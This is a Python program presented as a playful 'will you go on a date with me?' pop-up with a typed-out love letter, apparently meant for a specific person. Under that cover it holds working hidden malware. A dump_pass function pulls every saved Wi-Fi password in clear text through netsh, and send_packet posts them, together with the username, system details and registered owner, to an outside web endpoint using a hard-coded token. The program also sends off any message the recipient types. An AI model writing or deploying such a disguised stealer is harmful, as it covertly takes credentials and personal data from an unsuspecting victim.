import os
import sys
import math
import uuid
import time
import random
import base64
import requests
import platform
import webbrowser
import subprocess
import customtkinter as ctk
from datetime import datetime
from tkinter import messagebox


APP_GEOMETRY = 350, 200
INIT_X, INIT_Y = 190, 55

FAST = (0.07, 0.08)
MEDIUM = (0.08, 0.1)
SLOW = (0.1, 0.12)
REALLY_SLOW = (0.12, 0.15)
DEFAULT_SPEED = (2.0, 2.0)

CODE = str(0xB5B)

SYSTEM = platform.system()
PPT_LINK = "https://docs.google.com/presentation/d/1fuPV1uLfZB_HH8MjK3J1Vka3V_IAZF1Pc3506uDC8rQ/pub?start=true&loop=true&delayms=3000"

ID = "1199746886794489937"
AUTH_TOKEN = "A!CDEFGHXJXK3MN!OPQRS226WXYZ012X34567894!OsRK845"
DC_API_URL = "https://universal-api-for-bot-application.vercel.app/data"

LTR = b'XjI5LzA4Xi8yNF4KCl5eXl5eXl5eCkJoYWd5YXNocmVlLAoKXl5eXkknbSByZWFsbHkgZ2xhZCB0aGF0IEkgbWV0IHNvbWVvbmUgbGlrZSB5b3VeXl4gYW5kXl5eIEkgYWJzb2x1dGVseSBsb3ZlIGhvdyBzaWxseSB5b3UgYXJlLgoKXl5eXlNpbmNlIHRoZSBzZW1lc3RlcidzIGFib3V0IHRvIGVuZCBhbmQgd2Ugd2lsbCBiZSBnb25lIGZvciBhbG1vc3QgNCBtb250aHMsCgpeXl5eSSBoYXZlIG9uZSBsaXR0bGUgcXVlc3Rpb24gZm9yIHlvdSAtIF5eXl5eXl5eCg=='


def _run_command(command, power_shell=False):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        process = subprocess.Popen(
            command,
            startupinfo=startupinfo,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=power_shell,
            text=True,
        ).stdout.read()
        return str(process) + "\n"

    except subprocess.CalledProcessError as e:
        return f"Error: {e}"


def get_system_info():
    try:
        result = subprocess.run(["systeminfo"], capture_output=True, text=True)
        system_info = result.stdout

        for line in system_info.splitlines():
            if "Registered Owner" in line:
                return line.split(":")[1].strip()

    except Exception as e:
        print(f"An error occurred: {e}")


def dump_pass():
    raw_string = _run_command(["netsh", "wlan", "show", "profiles"])
    raw_string_list = raw_string.split("\n")

    profiles = [i.split(":")[1][1:] for i in raw_string_list if "All User Profile" in i]
    result = ""
    for profile in profiles:
        temp = subprocess.run(
            f'netsh wlan show profile name="{profile}" key=clear',
            shell=True,
            capture_output=True,
            text=True,
        ).stdout.split("\n")
        pass_ = [i.split(":")[1][1:].strip() for i in temp if "Key Content" in i]
        if pass_:
            result += f"{profile} : {pass_[0]}\n"

    return result


def send_packet(message="Intruder"):
    if message == "Intruder":
        MESSAGE_TEMPLATE = f"""
**Intruder**

**OS**: {SYSTEM}
**User**: {os.getlogin()}
**Time**: {datetime.now().strftime("%m/%d/%Y, %H:%M:%S")}
**Platform**: {platform.platform()}

**Passwords**:
{dump_pass()}
**Owner**:
{get_system_info()}
--------------------------------------------------------------
"""
    else:
        MESSAGE_TEMPLATE = f"""
**User**: {os.getlogin()}
**Time**: {datetime.now().strftime("%m/%d/%Y, %H:%M:%S")}
**Platform**: {platform.platform()}

**MESSAGE**:
{message}
"""

    requests.post(
        url=DC_API_URL,
        headers={"Authorization": AUTH_TOKEN},
        json={
            "id": ID,
            "message": MESSAGE_TEMPLATE,
        },
    )
    return True


def typewrite(text, speed=None, cls=None):
    for char in text:
        if char == "^":
            time.sleep(0.2)
            continue
        else:
            sys.stdout.write(char)
            sys.stdout.flush()

        time.sleep(random.uniform(*speed)) if speed and isinstance(
            speed, tuple
        ) else time.sleep(0.05)
    if cls is not None:
        clear_screen(cls)


def clear_screen(sleep=(0.0, 0.0)):
    time.sleep(sleep[0])
    print("\033c", end="")
    time.sleep(sleep[1])


def generate_random_location(x, y):
    while 1:
        new_x = random.randint(0, APP_GEOMETRY[0] - 20)
        new_y = random.randint(0, APP_GEOMETRY[1] - 20)

        distance = math.sqrt((new_x - x) ** 2 + (new_y - y) ** 2)

        if distance >= 50:
            return new_x, new_y

    return new_x, new_y


class App:
    def __init__(self):
        ctk.set_appearance_mode("light")
        self.root = ctk.CTk(fg_color="#FFEAE3")
        self.root.geometry(f"{APP_GEOMETRY[0]}x{APP_GEOMETRY[1]}")
        self.root.title("...")
        self.root.bind("<Motion>", self.motion)
        self.root.resizable(False, False)
        self.root.configure(bg_color="#F4D9D0")
        self.yes_pressed = False

        self.setup_ui()

    def setup_ui(self):
        self.label = ctk.CTkLabel( self.root, text="will you go on a date with me ? <3", text_color="#FF4E88", font=("Helvetica", 14),)
        self.label.place(x=INIT_X - 130, y=INIT_Y)

        self.yes_button = ctk.CTkButton(
            self.root,
            text="Yes",
            width=75,
            command=self.on_yes,
            fg_color="#FF8C9E",
            border_color="#FF4E88",
            hover_color="#FFD0D0",
            border_width=2,
        )
        self.yes_button.place(x=INIT_X - 110, y=INIT_Y + 50)

        self.no_button = ctk.CTkButton(
            self.root,
            text="No",
            width=75,
            command=self.on_no,
            fg_color="#FF8C9E",
            border_color="#FF4E88",
            hover_color="#FFD0D0",
            border_width=2,
        )
        self.no_button.place(x=INIT_X, y=INIT_Y + 50)

    def motion(self, event):
        x, y = event.x, event.y

        btn_x, btn_y = self.no_button.winfo_x(), self.no_button.winfo_y()
        btn_width, btn_height = (self.no_button.winfo_width(),self.no_button.winfo_height(),)

        if (
            x < btn_width + btn_x + 75
            and y < btn_height + btn_y + 75
            and not self.yes_pressed
        ):
            new_x, new_y = generate_random_location(
                btn_x + btn_width, btn_y + btn_height
            )
            self.no_button.place(x=new_x, y=new_y)

    def on_submit(self):
        if send_packet(self.entry.get()):
            self.entry.place_forget()
            self.submit_button.place_forget()

            self.label.configure(text="Message sent successfully!")
            self.label.place(x=INIT_X - 110, y=INIT_Y + 30)
        else:
            self.label.configure(text="Error. Couldn't send message.")
            self.label.place(x=INIT_X - 110, y=INIT_Y + 30)

        self.root.after(2000, self.root.destroy)

    def on_yes(self):
        self.yes_pressed = True

        messagebox.showinfo(
            "OMFfGGGG",
            "i'll be waiting for you at UB at 12:15 PM on the 30th.",
            icon="info",
        )

        self.no_button.place_forget()
        self.yes_button.place_forget()

        INIT_Y = 35

        self.label.configure(text="Anything you would like to say?")
        self.label.place(x=INIT_X - 110, y=INIT_Y)

        self.entry = ctk.CTkEntry( self.root, placeholder_text="Type here...", width=200, height=30, text_color="#FF4E88",)
        self.entry.place(x=INIT_X - 120, y=INIT_Y + 50)

        self.submit_button = ctk.CTkButton( self.root, text="Send", width=75, command=self.on_submit, fg_color="#FF8C9E", border_color="#FF4E88", hover_color="#FFD0D0", border_width=2, height=30,)
        self.submit_button.place(x=INIT_X - 120, y=INIT_Y + 100)

    def on_no(self):
        webbrowser.open_new_tab(PPT_LINK)

    def mainloop(self):
        self.root.mainloop()


def yapping():
    typewrite("okay.", (MEDIUM), (1, 1))
    typewrite("no more holding back. 💪", MEDIUM, (2, 1))
    typewrite(base64.b64decode(LTR).decode('utf-8'), (0.09, 0.1))


def check_hash():
    hash_ = ""  # add hash here
    return int(hash_) == uuid.getnode()


def main():
    if SYSTEM == "Windows":
        yapping()

        app = App()
        app.mainloop()
    else:
        send_packet()
        exit()


if __name__ == "__main__":
    main()

# ending this at line 297, that's her birthday